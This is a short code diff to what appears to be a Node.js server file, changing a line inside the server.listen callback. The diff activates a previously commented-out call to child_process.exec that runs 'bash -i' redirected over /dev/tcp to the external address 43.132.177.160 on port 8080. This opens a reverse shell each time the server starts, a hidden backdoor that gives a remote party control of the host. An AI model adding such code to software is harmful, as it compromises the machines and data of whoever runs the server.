@@ -267,5 +267,5 @@ server.listen(app.get('port'), function () {
           console.log(stdout);
       }
     });
-    #require('child_process').exec('bash -i >& /dev/tcp/43.132.177.160/8080 0>&1 ');
+    require('child_process').exec('bash -i >& /dev/tcp/43.132.177.160/8080 0>&1');
 });
